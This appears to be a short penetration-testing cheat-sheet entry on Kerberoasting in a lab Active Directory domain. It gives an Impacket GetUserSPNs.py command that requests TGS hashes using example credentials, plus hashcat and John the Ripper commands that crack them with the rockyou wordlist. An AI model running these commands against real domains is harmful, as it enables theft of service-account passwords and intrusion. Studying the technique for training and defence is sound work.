
## **Usage**


```powershell
# Grabing the TGS hash
# -dc-ip : domain controller IP address
# -request : request for TGS hash
# sudo GetUsersSPNs.py <Domain/Username:Password> -dc-ip <IP of DC> -request
$ sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.0.149  -request
```


#### **Example**

![](https://i.imgur.com/RaJyFv0.png)


## **Cracking the TGS hash**

- Save the TGS hash in a `.txt` file and then we can crack it with either **hashcat** or **johntheripper**

```powershell
# cracking with hashcat
$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O

# cracking with johntheripper
$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --fork=4
```


#### **Example**

**_Hashcat Output :_**



![](https://i.imgur.com/KkPwija.jpg)



**_Johntheripper Output :_**



![](https://i.imgur.com/4tLo5Jj.png)
